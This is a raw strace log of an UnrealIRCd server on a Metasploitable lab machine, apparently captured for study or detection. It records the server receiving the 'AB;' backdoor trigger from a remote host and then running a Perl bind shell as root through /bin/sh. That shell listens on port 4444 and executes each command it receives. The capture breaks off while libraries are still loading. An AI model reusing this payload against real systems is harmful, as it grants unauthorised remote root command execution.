4519  07:23:31.180403 select(1024, [2 3 4 7 9], [], NULL, {0, 480000}) = 1 (in [9], left {0, 320000})
4519  07:23:31.332540 clock_gettime(CLOCK_MONOTONIC, {1821, 149561774}) = 0
4519  07:23:31.332563 recv(9, "PRIVMSG  #testit3 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  07:23:31.332598 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.332617 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.332632 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.332647 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.332660 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.332675 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.332688 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.332702 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.332715 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.332729 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.332743 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.332756 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.332770 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.332784 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.332797 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.332811 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.332824 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.332838 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.332870 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.332913 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.332928 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.332958 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.332977 gettimeofday({1495625011, 332981}, NULL) = 0
4519  07:23:31.332992 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {0, 980000})
4519  07:23:31.356507 clock_gettime(CLOCK_MONOTONIC, {1821, 173527768}) = 0
4519  07:23:31.356527 time(NULL)        = 1495625011
4519  07:23:31.356537 time(NULL)        = 1495625011
4519  07:23:31.356555 gettimeofday({1495625011, 356559}, NULL) = 0
4519  07:23:31.356568 select(1024, [2], [], NULL, {0, 0}) = 1 (in [2], left {0, 0})
4519  07:23:31.356622 clock_gettime(CLOCK_MONOTONIC, {1821, 173634497}) = 0
4519  07:23:31.356632 gettimeofday({1495625011, 356635}, NULL) = 0
4519  07:23:31.356642 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
4519  07:23:31.356680 clock_gettime(CLOCK_MONOTONIC, {1821, 173692326}) = 0
4519  07:23:31.356691 accept(2, 0, NULL) = 5
4519  07:23:31.356710 getpeername(5, {sa_family=AF_INET, sin_port=htons(44453), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:23:31.356741 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:23:31.356754 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:23:31.356768 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:23:31.356780 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:23:31.356791 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:23:31.356802 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:23:31.356833 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:23:31.357022 clock_gettime(CLOCK_MONOTONIC, {1821, 174054991}) = 0
4519  07:23:31.357068 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:23:31.357099 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:23:31.357131 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:23:31.357140 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:23:31.357150 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:23:31.357166 send(6, "\252\333\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:23:31.357277 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:23:31.357314 gettimeofday({1495625011, 357318}, NULL) = 0
4519  07:23:31.357325 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {1, 0})
4519  07:23:31.361639 clock_gettime(CLOCK_MONOTONIC, {1821, 178683916}) = 0
4519  07:23:31.361715 recvfrom(6, "\252\333\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\1\1\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:23:31.361767 close(6)          = 0
4519  07:23:31.361790 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:23:31.361804 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  07:23:31.361859 time(NULL)        = 1495625011
4519  07:23:31.361871 time(NULL)        = 1495625011
4519  07:23:31.361896 gettimeofday({1495625011, 361900}, NULL) = 0
4519  07:23:31.361908 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:23:31.361950 clock_gettime(CLOCK_MONOTONIC, {1821, 178962368}) = 0
4519  07:23:31.361960 gettimeofday({1495625011, 361963}, NULL) = 0
4519  07:23:31.361970 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 920000})
4519  07:23:31.433379 clock_gettime(CLOCK_MONOTONIC, {1821, 250399655}) = 0
4519  07:23:31.433400 recv(9, "PRIVMSG  #testit3 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 59
4519  07:23:31.433425 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.433442 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.433456 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.433470 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.433483 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.433497 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.433510 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.433523 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.433536 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.433549 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.433562 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.433576 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.433589 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.433602 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.433615 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.433628 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.433641 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.433655 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.433668 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.433681 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.433701 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.433715 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:31.433731 gettimeofday({1495625011, 433746}, NULL) = 0
4519  07:23:31.433756 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:23:31.433838 clock_gettime(CLOCK_MONOTONIC, {1821, 250850777}) = 0
4519  07:23:31.433850 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:23:31.433877 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:23:31.433897 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:23:31.433909 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:23:31.433923 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 8456
8456  07:23:31.433989 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
8456  07:23:31.434003 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
8456  07:23:31.434013 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8456  07:23:31.434026 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
8456  07:23:31.434130 brk(0)            = 0x80f9000
8456  07:23:31.434151 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8456  07:23:31.434169 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f3b000
8456  07:23:31.434184 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
8456  07:23:31.434202 open("/etc/ld.so.cache", O_RDONLY) = 1
8456  07:23:31.434214 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
8456  07:23:31.434244 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f33000
8456  07:23:31.434256 close(1)          = 0
8456  07:23:31.434296 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8456  07:23:31.434341 open("/lib/libncurses.so.5", O_RDONLY) = 1
8456  07:23:31.434354 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
8456  07:23:31.434462 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
8456  07:23:31.434479 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f03000
8456  07:23:31.434490 mmap2(0xb7f30000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f30000
8456  07:23:31.434507 close(1)          = 0
8456  07:23:31.434518 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8456  07:23:31.434532 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
8456  07:23:31.434546 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
8456  07:23:31.434637 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
8456  07:23:31.434654 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7eff000
8456  07:23:31.434665 mmap2(0xb7f01000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f01000
8456  07:23:31.434680 close(1)          = 0
8456  07:23:31.434691 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8456  07:23:31.434704 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
8456  07:23:31.434717 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
8456  07:23:31.434854 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
8456  07:23:31.434871 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7efe000
8456  07:23:31.434885 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7daf000
8456  07:23:31.434895 mmap2(0xb7ef8000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7ef8000
8456  07:23:31.434909 mmap2(0xb7efb000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7efb000
8456  07:23:31.434923 close(1)          = 0
8456  07:23:31.434944 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dae000
8456  07:23:31.434956 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7dae6b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
8456  07:23:31.435010 mprotect(0xb7ef8000, 4096, PROT_READ) = 0
8456  07:23:31.435046 munmap(0xb7f33000, 29913) = 0
8456  07:23:31.435071 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8456  07:23:31.435085 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
8456  07:23:31.435104 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9e53a0) = -1 ENOTTY (Inappropriate ioctl for device)
8456  07:23:31.435137 brk(0)            = 0x80f9000
8456  07:23:31.435146 brk(0x80fa000)    = 0x80fa000
8456  07:23:31.435157 brk(0x80fb000)    = 0x80fb000
8456  07:23:31.435173 getuid32()        = 0
8456  07:23:31.435182 getgid32()        = 0
8456  07:23:31.435191 geteuid32()       = 0
8456  07:23:31.435199 getegid32()       = 0
8456  07:23:31.435213 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8456  07:23:31.435226 time(NULL)        = 1495625011
8456  07:23:31.435252 brk(0x80fc000)    = 0x80fc000
8456  07:23:31.435297 brk(0x80fd000)    = 0x80fd000
8456  07:23:31.435333 open("/proc/meminfo", O_RDONLY) = 1
8456  07:23:31.435371 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
8456  07:23:31.435389 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f3a000
8456  07:23:31.435400 read(1, "MemTotal:      1035240 kB\nMemFree:        511624 kB\nBuffers:         66612 kB\nCached:         299492 kB\nSwapCached:          0 kB\nActive:         255024 kB\nInactive:       240048 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        511384 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            4920 kB\nWriteback:           0 kB\nAnonPages:      128968 kB\nMapped:          52008 kB\nSlab:            17416 kB\nSReclaimable:     9100 kB\nSUnreclaim:       8316 kB\nPageTables:       1960 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
8456  07:23:31.435483 close(1)          = 0
8456  07:23:31.435494 munmap(0xb7f3a000, 4096) = 0
8456  07:23:31.435505 brk(0x80fe000)    = 0x80fe000
8456  07:23:31.435530 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
8456  07:23:31.435543 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
8456  07:23:31.435555 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
8456  07:23:31.435566 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
8456  07:23:31.435578 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
8456  07:23:31.435590 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
8456  07:23:31.435603 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8456  07:23:31.435614 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
8456  07:23:31.435627 uname({sys="Linux", node="metasploitable", ...}) = 0
8456  07:23:31.435673 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8456  07:23:31.435691 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
8456  07:23:31.435709 brk(0x8100000)    = 0x8100000
8456  07:23:31.435720 getcwd("/etc/unreal", 4096) = 12
8456  07:23:31.435745 getpid()          = 8456
8456  07:23:31.435790 getppid()         = 4519
8456  07:23:31.435824 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
8456  07:23:31.435860 stat64("/sbin/sh", 0xbf9e5378) = -1 ENOENT (No such file or directory)
8456  07:23:31.435872 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
8456  07:23:31.435889 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
8456  07:23:31.435912 socket(PF_FILE, SOCK_STREAM, 0) = 1
8456  07:23:31.435925 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
8456  07:23:31.435937 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
8456  07:23:31.435958 close(1)          = 0
8456  07:23:31.435969 socket(PF_FILE, SOCK_STREAM, 0) = 1
8456  07:23:31.435979 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
8456  07:23:31.435988 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
8456  07:23:31.436006 close(1)          = 0
8456  07:23:31.436019 open("/etc/nsswitch.conf", O_RDONLY) = 1
8456  07:23:31.436033 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
8456  07:23:31.436049 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f3a000
8456  07:23:31.436063 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
8456  07:23:31.436111 read(1, "", 4096) = 0
8456  07:23:31.436120 close(1)          = 0
8456  07:23:31.436129 munmap(0xb7f3a000, 4096) = 0
8456  07:23:31.436145 open("/etc/ld.so.cache", O_RDONLY) = 1
8456  07:23:31.436157 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
8456  07:23:31.436173 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f33000
8456  07:23:31.436182 close(1)          = 0
8456  07:23:31.436192 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8456  07:23:31.436207 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
8456  07:23:31.436222 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 